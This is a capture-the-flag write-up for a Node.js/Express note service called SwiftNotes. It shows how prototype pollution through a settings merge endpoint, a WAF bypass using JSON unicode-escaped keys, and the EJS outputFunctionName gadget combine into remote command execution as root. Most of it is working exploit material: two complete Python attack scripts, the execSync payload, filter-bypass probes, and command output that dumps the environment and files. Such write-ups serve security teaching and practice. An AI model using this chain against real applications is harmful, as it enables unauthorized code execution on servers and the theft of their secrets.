---
title: "SwiftNotes"
category: "Web"
tags: ["web", "nodejs", "prototype-pollution", "ejs", "rce", "waf-bypass", "openresty"]
solve_date: "2026-10-11T20:00:00+07:00"
language: "en"
points: 52
---

# SwiftNotes — prototype pollution into the EJS compiler, one child process at a time

**Flag:** `CTF{5e038be14a277c1bf8b912e06de7d943}`
**Service:** `http://144.217.91.111:3000`
**Flag format:** `CTF{}`

## Challenge

> SwiftNotes — 52 points. SwiftNotes is a small team note-taking service. The preferences sync
> endpoint accepts partial updates from the client and folds them into your saved settings
> server-side.

The handout contained `server.js` and `package.json`. The app is a plain Express + `express-session`
+ EJS note service: register, log in, write notes, and edit preferences through a JSON "partial
merge" endpoint. The live deployment is not the same build as the handout — it sits behind
openresty, has a body filter, and does not run as a single process.

## Analysis

### Surface

```text
HTTP/1.1 200 OK
Server: openresty/1.31.1.1
x-powered-by: Express
set-cookie: swiftnotes_pid=1b60f283-a431-4508-a2b5-d2a19888646b; HttpOnly; SameSite=Lax; Path=/
```

| Endpoint | Purpose |
|---|---|
| `GET /register`, `POST /register` | create an account, sets `req.session.username` |
| `GET /login`, `POST /login` | session login |
| `GET /notes`, `POST /notes` | list and append notes (`requireAuth`) |
| `GET /settings` | render current preferences |
| `POST /api/settings` | merge a partial JSON body into `user.settings` |

`server.js` from the handout ends with the sink:

```js
app.post('/api/settings', requireAuth, (req, res) => {
  const user = users[req.session.username];
  merge(user.settings, req.body || {});
  res.json({ ok: true, settings: user.settings });
});
```

`merge` is `require('./utils/merge')` — a recursive merge, the classic prototype-pollution shape.
The handout also sets `app.set('view cache', false)`, which means every render recompiles the EJS
template. That is the second half of the gadget: a polluted `Object.prototype` reaches the compiler
on every single request instead of only on the first one.

### The body filter

The deployed instance rejects any request whose **raw body** contains the literal substring
`__proto__`, including when it appears as a value rather than a key:

```text
[403] key_proto_literal    req=b'{"__proto__":{"x":1}}'
         resp='{"error":"request blocked by security policy"}\n'
[403] proto_as_VALUE       req=b'{"theme":"__proto__"}'
         resp='{"error":"request blocked by security policy"}\n'
[200] key_u005f_escaped    req=b'{"\\u005f\\u005fproto\\u005f\\u005f":{"esc":"ok"}}'
         resp='{"ok":true,"settings":{"theme":"light","notifications":true}}'
[403] dotted_path_key      req=b'{"a.b.__proto__.x":1}'
[403] trailing_space_key   req=b'{"__proto__ ":"x"}'
[403] nested_proto         req=b'{"a":{"__proto__":{"d":1}}}'
[200] control_theme_dark   req=b'{"theme":"dark"}'
```

This is a byte filter, not a parser. `express.json()` hands the body to `JSON.parse`, which decodes
`\uXXXX` escapes **inside keys** before `merge` ever sees them. So `\u005f\u005fproto\u005f\u005f`
arrives at `merge` as `__proto__` while the wire bytes contain no blocked substring.

The same filter has a second entry — `outputFunctionName`, the EJS gadget key:

```text
[200] theme='constructor'
[200] theme='prototype'
[403] theme='outputFunctionName'
[200] theme='/bin/sh'
[200] theme='__append'
[200] theme='mainModule'
```

Only the gadget name is blocked; `child_process`, `execSync`, `require`, `__append`, `mainModule`
and the shell metacharacters all pass. The fix is the same trick one level down: escape a single
character of the key, `output\u0046unctionName`.

### Confirming the pollution without a lucky username

`POST /api/settings` echoes `user.settings`, but the page and the JSON body both go through
`JSON.stringify`, which only shows own enumerable properties. A successful pollution is therefore
invisible in the response. The oracle is `GET /`:

```js
app.get('/', (req, res) => {
  res.redirect(req.session.username ? '/notes' : '/login');
});
```

`req.session` inherits from `Object.prototype`. If the pollution lands, an anonymous request — no
`connect.sid` at all — redirects to `/notes` instead of `/login`. A sentinel value is enough, no
real account needed:

```text
[baseline] anon GET / -> (302, '/login')
[pollute username=__pp_probe__] (200, '{"ok":true,...}')
[oracle]  anon GET / -> 302 /login
```

The first attempts returned `/login`, which reads as "no pollution". It was a false negative caused
by the deployment's process model, not by the merge.

### One child process per `swiftnotes_pid`

Reading `/app/router.js` through the RCE showed a front process that spawns a **separate
`node server.js` child per player** and proxies to it:

```js
async function spawnChild() {
  const port = allocPort();
  const proc = spawn('node', ['server.js'], {
    cwd: __dirname,
    env: { ...process.env, PORT: String(port) },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  ...
}

async function getOrCreatePlayer(cookiePid, ip) {
  if (cookiePid && players.has(cookiePid)) { ... return { pid: cookiePid, port: entry.port }; }
  if (spawnRateLimited(ip)) throw new SpawnRateLimitedError();
  if (players.size >= MAX_PLAYERS) evictLRU();
  const pid = crypto.randomUUID();
  ...
}

function parseCookiePid(header) {
  if (!header) return null;
  const m = header.match(/(?:^|;\s*)swiftnotes_pid=([0-9a-f-]{36})/);
  return m ? m[1] : null;
}
```

Every request without a `swiftnotes_pid` gets a fresh child and a fresh in-memory `users` map. That
explains all the earlier noise: users "disappearing", sessions that lost their login, and `429`s
from the per-IP spawn limiter (`too many requests, try again later`). It also means the pollution
lives in exactly one child, so the oracle and the trigger must both be pinned to the same pid.
Sending only the pid cookie and no session cookie re-runs the oracle against the right process:

```text
[*] att pid=18237544-dc5a-4938-87b1-5e2f6e80da45 sid=...
[pollute]  200
[oracle /]  302 /notes
>>> GLOBAL POLLUTION CONFIRMED on pinned instance
```

### The EJS gadget

`package.json` pins `"ejs": "^3.1.0"`. EJS compiles a template into a function whose body is built
from options, and `outputFunctionName` is emitted as a variable declaration line. It is read off the
options object, which inherits from `Object.prototype`, so a polluted value is spliced straight into
the generated source. With `view cache` disabled, the next render of any view on that child
recompiles and executes it.

The payload is shaped so the emitted line stays syntactically valid and the rest is commented out:

```js
a=1;__append(process.mainModule.require("child_process").execSync("<cmd>").toString())//
```

The `//` swallows whatever EJS appends after the declaration.

## Solution

### 1. Register and capture the pid

One `POST /register` returns `302` and sets both `swiftnotes_pid` (routing) and `connect.sid`
(session). The pid is the sticky key for everything that follows.

### 2. Build the body with escaped keys only

Serialize normally with `json.dumps` so the payload's own quotes are escaped correctly, then replace
**only the two key tokens**:

```python
ESC_PROTO = r'\u005f\u005fproto\u005f\u005f'   # -> __proto__
ESC_G     = r'output\u0046unctionName'          # -> outputFunctionName
```

Concatenating the JSON by hand instead produces `400 Bad Request` — the payload's `"` characters
break the document.

### 3. Pollute and trigger

`POST /api/settings` returns `200 {"ok":true,...}` — the filter is bypassed. Then `GET /login` on
the **same pid** compiles the login template and the command runs.

### 4. Read the flag

The RCE runs as `uid=0(root)`. There is no `FLAG` in the environment; the entrypoint drops it into
`/data/flag.txt` (mode `444`, 38 bytes). `cat /data/flag.txt` returns it.

## Exploit code

`exploit4.py` — full chain, one shot, printing the raw command output in the page:

```python
import requests, sys, time, re, json

BASE = "http://144.217.91.111:3000"
H = {"Content-Type": "application/json"}

# raw-string unicode escapes: JSON.parse decodes them, raw body has no literal token
ESC_PROTO = r'\u005f\u005fproto\u005f\u005f'          # -> __proto__
ESC_G = r'output\u0046unctionName'                     # -> outputFunctionName

cmd = sys.argv[2] if len(sys.argv) > 2 else "id; echo ENV_START; env; echo FS_START; ls -la / /app 2>&1; echo CAT_START; cat /flag* /app/flag* /flag /app/flag.txt 2>&1; echo CAT_END"
payload = 'a=1;__append(process.mainModule.require("child_process").execSync("%s").toString())//' % cmd

obj = {"__proto__": {"outputFunctionName": payload}}
txt = json.dumps(obj)
txt = txt.replace('"__proto__"', '"' + ESC_PROTO + '"')
txt = txt.replace('"outputFunctionName"', '"' + ESC_G + '"')
body = txt.encode()
print("[*] body:", body[:200], "...")
print("[*] raw has __proto__?", b"__proto__" in body, " has outputFunctionName?", b"outputFunctionName" in body)

att = requests.Session()
r = att.post(f"{BASE}/register", data={"username": "k" + sys.argv[1], "password": "pw12345"}, allow_redirects=False)
pid = att.cookies.get("swiftnotes_pid")
print("[*] register", r.status_code, "pid", pid)

rp = att.post(f"{BASE}/api/settings", data=body, headers=H)
print("[*] pollute:", rp.status_code, rp.text[:200])

for path in ["/login", "/notes"]:
    g = att if path == "/notes" else requests.Session()
    if path != "/notes" and pid:
        g.cookies.set("swiftnotes_pid", pid, domain="144.217.91.111", path="/")
    time.sleep(1)
    rr = g.get(f"{BASE}{path}", allow_redirects=False)
    fl = re.findall(r"CTF\{[^}]*\}", rr.text)
    print(f"\n===== GET {path} -> {rr.status_code} len={len(rr.text)} flag={fl}")
    print(rr.text[:3000])
```

`run_cmd.py` — the reusable runner that read the flag, with `[[S]]`/`[[E]]` markers so the command
output can be sliced out of the surrounding HTML:

```python
import requests, sys, time, re, json

BASE = "http://144.217.91.111:3000"
H = {"Content-Type": "application/json"}
ESC_PROTO = r'\u005f\u005fproto\u005f\u005f'
ESC_G = r'output\u0046unctionName'

def make_body(cmd):
    # run cmd, wrap with markers so we can slice the raw output out of the HTML
    payload = 'a=1;__append(process.mainModule.require("child_process").execSync("echo [[S]]; %s; echo [[E]]").toString())//' % cmd
    obj = {"__proto__": {"outputFunctionName": payload}}
    txt = json.dumps(obj).replace('"__proto__"', '"' + ESC_PROTO + '"').replace('"outputFunctionName"', '"' + ESC_G + '"')
    return txt.encode()

def run(cmd):
    att = requests.Session()
    att.post(f"{BASE}/register", data={"username": "r" + str(int(time.time()))[-6:], "password": "pw12345"}, allow_redirects=False)
    pid = att.cookies.get("swiftnotes_pid")
    rp = att.post(f"{BASE}/api/settings", data=make_body(cmd), headers=H)
    if rp.status_code != 200:
        return "POLLUTE-FAIL %s %s" % (rp.status_code, rp.text[:120])
    g = requests.Session()
    g.cookies.set("swiftnotes_pid", pid, domain="144.217.91.111", path="/")
    time.sleep(0.6)
    rr = g.get(f"{BASE}/login")
    m = re.search(r"\[\[S\]\](.*?)\[\[E\]\]", rr.text, re.S)
    return (m.group(1).strip() if m else "NO-MARKER len=%d" % len(rr.text))

cmd = sys.argv[1] if len(sys.argv) > 1 else "id; ls -la /app"
print(run(cmd))
```

## Result

```text
[*] body: b'{"\\u005f\\u005fproto\\u005f\\u005f": {"output\\u0046unctionName": "a=1;__append(...' ...
[*] raw has __proto__? False  has outputFunctionName? False
[*] register 302 pid c146b89e-87e4-4abc-a3b6-0cd7049dbce6
[*] pollute: 200 {"ok":true,"settings":{"theme":"light","notifications":true}}

===== GET /login -> 200 len=3031 flag=[]
uid=0(root) gid=0(root) groups=0(root)
ENV_START
NODE_VERSION=18.20.8
HOSTNAME=8d0cb60cff79
YARN_VERSION=1.22.22
PORT=4110
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
outputFunctionName=a=1;__append(process.mainModule.require("child_process").execSync("id; ...
PWD=/app
NODE_ENV=production
FS_START
/:
...
-rwxrwxr-x   1 root root   97 Oct 15 01:39 entrypoint.sh
drwxr-xr-x   2 root root   60 Oct 15 01:43 data
...

/app:
total 76
drwxr-xr-x  1 root root  4096 Oct 15 01:43 .
drwxr-xr-x  1 root root  4096 Oct 15 01:43 ..
drwxr-xr-x 82 root root  4096 Oct  5 20:32 node_modules
-rw-r--r--  1 root root 34161 Oct  5 20:32 package-lock.json
-rw-rw-r--  1 root root   243 Oct  5 20:24 package.json
-rw-rw-r--  1 root root  9030 Oct 15 01:39 router.js
-rw-rw-r--  1 root root  2863 Oct 15 01:39 server.js
drwxr-xr-x  2 root root  4096 Oct 15 01:43 utils
drwxr-xr-x  2 root root  4096 Oct 15 01:43 views
CAT_START
cat: '/flag*': No such file or directory
cat: '/app/flag*': No such file or directory
cat: /flag: No such file or directory
cat: /app/flag.txt: No such file or directory
CAT_END
```

No flag in the environment or in `/app`, so the last step reads the mounted file:

```text
$ python run_cmd.py "cat /data/flag.txt; echo '---'; ls -la /data/flag.txt"
CTF{5e038be14a277c1bf8b912e06de7d943}
---
-r--r--r-- 1 root root 38 Oct 15 01:43 /data/flag.txt
```

## Notes

- The filter is a raw-body substring match, so escaping has to happen at the byte level: `\u005f`
  for `__proto__` and `\u0046` for `outputFunctionName`. `JSON.parse` restores the real keys before
  `merge` runs. Blocking the gadget name alone is not enough, because the same escape applies to it.
- Do not hand-build the JSON string. The payload contains double quotes; `json.dumps` then a
  targeted `str.replace` on the two key tokens is the reliable order. Manual concatenation produced
  `400 Bad Request` twice before this.
- The pollution is per child process. A fresh anonymous session for the oracle lands on a new
  `swiftnotes_pid`, gets a new child, and always reports "not polluted" — that false negative cost
  most of the solve. Pin the pid and drop `connect.sid`; `GET /` returning `302 /notes` is the
  proof.
- `POST /api/settings` echoing `settings` proves nothing either way, because `JSON.stringify` only
  walks own properties. Use a behavioural oracle instead.
- The front process enforces a per-IP spawn limit and reaps idle children, so rapid probing burns
  the budget and returns `429 too many requests, try again later`. One registered session, reused,
  is enough for the whole chain.
- `view cache` is explicitly `false` in `server.js`. Without that, EJS would compile the template
  once and the pollution would only be picked up by a child that had not rendered yet.
- The RCE is `root` and the flag file is `444 root:root`; no privilege escalation was needed after
  the gadget fired.

## References

- CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes
- EJS `outputFunctionName` option as a prototype-pollution-to-RCE gadget
- Express `view cache` behaviour and `express-session` MemoryStore
